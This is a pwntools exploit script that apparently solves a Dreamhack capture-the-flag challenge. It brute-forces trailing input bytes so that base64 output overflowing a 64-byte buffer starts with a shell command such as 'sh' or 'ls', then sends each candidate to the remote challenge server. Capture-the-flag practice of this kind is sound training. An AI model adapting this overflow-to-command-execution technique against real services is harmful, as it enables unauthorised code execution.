from pwn import *
import base64

context.log_level = 'info'
HOST = 'host3.dreamhack.games'
PORT = 18572

# CRITICAL DISCOVERY:
# sendline() adds \n which gets BASE64 ENCODED!
# So if we send 48 bytes with sendline(), we actually encode 49 bytes (48 + \n)
#
# Strategy: Account for the newline in our calculations
# We want base64 output at position 64+ to be a valid command

print("[*] New strategy: Account for newline in base64 encoding")
print("="*60)

# If we sendline() N bytes, we encode N+1 bytes (including \n)
# 47 bytes + \n = 48 bytes -> 64 bytes base64 (exact fit, no overflow)
# 48 bytes + \n = 49 bytes -> 68 bytes base64 (4 bytes overflow)
# 49 bytes + \n = 50 bytes -> 68 bytes base64 (4 bytes overflow)
# 50 bytes + \n = 51 bytes -> 68 bytes base64 (4 bytes overflow)
# 51 bytes + \n = 52 bytes -> 72 bytes base64 (8 bytes overflow)

# Let's find what produces "sh\n" in base64 output
# If base64 has "sh\n", system might interpret as just "sh"

print("\n[*] Searching for input that produces 'sh' considering newline...")

# We want: 47 bytes + X + \n where base64(47 bytes + X + \n) has "sh" at position 64+

for x1 in range(256):
    for x2 in range(256):
        test_payload = b'A' * 46 + bytes([x1, x2]) + b'\n'  # 49 bytes total
        test_b64 = base64.b64encode(test_payload)
        
        if len(test_b64) >= 68:
            overflow = test_b64[64:68]
            if overflow.startswith(b'sh'):
                print(f"[+] Found! x1={x1:02x} x2={x2:02x}")
                print(f"    Payload: 46 A's + {bytes([x1, x2]).hex()} + newline")
                print(f"    Base64: {test_b64}")
                print(f"    Overflow: {overflow}")
                
                # Test it!
                p = remote(HOST, PORT, level='error')
                p.recvuntil(b'> ')
                p.sendline(b'1')
                p.sendline(b'A' * 46 + bytes([x1, x2]))
                
                result = p.recvuntil(b'> ')
                p.sendline(b'2')
                
                output = p.recvall(timeout=2)
                if len(output) > 0:
                    print(f"\n[SUCCESS] Got output!")
                    print(output.decode('latin1'))
                    p.close()
                    exit(0)
                    
                p.close()
                print()

# Also try other commands: ls, id, pwd
print("\n[*] Trying other 2-char commands...")

for cmd in [b'ls', b'id', b'ps']:
    print(f"\n[*] Searching for '{cmd.decode()}'...")
    for x1 in range(256):
        for x2 in range(256):
            test_payload = b'A' * 46 + bytes([x1, x2]) + b'\n'
            test_b64 = base64.b64encode(test_payload)
            
            if len(test_b64) >= 68:
                overflow = test_b64[64:68]
                if overflow.startswith(cmd):
                    print(f"    [+] Found! {bytes([x1, x2]).hex()} -> {overflow}")
                    
                    p = remote(HOST, PORT, level='error')
                    p.recvuntil(b'> ')
                    p.sendline(b'1')
                    p.sendline(b'A' * 46 + bytes([x1, x2]))
                    p.recvuntil(b'> ')
                    p.sendline(b'2')
                    
                    output = p.recvall(timeout=2)
                    if len(output) > 0:
                        print(f"\n[SUCCESS with {cmd.decode()}!]")
                        print(output.decode('latin1'))
                        p.close()
                        exit(0)
                    
                    p.close()
                    break
        else:
            continue
        break

# Try 3-char commands with longer payloads
print("\n[*] Trying 3-char commands (cat, pwd, env)...")

for cmd in [b'cat', b'pwd', b'env', b'who']:
    print(f"\n[*] Searching for '{cmd.decode()}'...")
    for x1 in range(256):
        for x2 in range(256):
            for x3 in range(256):
                test_payload = b'A' * 45 + bytes([x1, x2, x3]) + b'\n'  # 49 bytes
                test_b64 = base64.b64encode(test_payload)
                
                if len(test_b64) >= 68 and test_b64[64:67] == cmd:
                    print(f"    [+] Found! {bytes([x1, x2, x3]).hex()} -> {test_b64[64:68]}")
                    
                    p = remote(HOST, PORT, level='error')
                    p.recvuntil(b'> ')
                    p.sendline(b'1')
                    p.sendline(b'A' * 45 + bytes([x1, x2, x3]))
                    p.recvuntil(b'> ')
                    p.sendline(b'2')
                    
                    output = p.recvall(timeout=2)
                    if len(output) > 0:
                        print(f"\n[SUCCESS with {cmd.decode()}!]")
                        print(output.decode('latin1'))
                        p.close()
                        exit(0)
                    
                    p.close()
                    break
            else:
                continue
            break
        else:
            continue
        break

print("\n[*] All attempts completed")